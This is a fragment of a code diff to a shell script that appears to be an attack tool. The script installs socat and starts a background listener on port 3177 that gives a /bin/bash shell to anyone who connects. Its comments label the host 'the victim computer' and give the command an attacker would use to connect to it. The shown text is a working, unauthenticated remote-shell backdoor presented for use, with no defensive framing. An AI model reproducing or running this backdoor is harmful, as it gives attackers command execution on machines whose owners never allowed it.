@@ -57,7 +57,7 @@ echo -e "
 
 "
 sudo apt-get install socat -y
-socat TCP4-Listen:3177,fork EXEC:/bin/bash #run the listener on the victim computer
+socat TCP4-Listen:3177,fork EXEC:/bin/bash & #run the listener on the victim computer
 #now computer will listen
 #to connect to t the victim computer
 #socat STDIO TCP4:TARGET_IP:3177
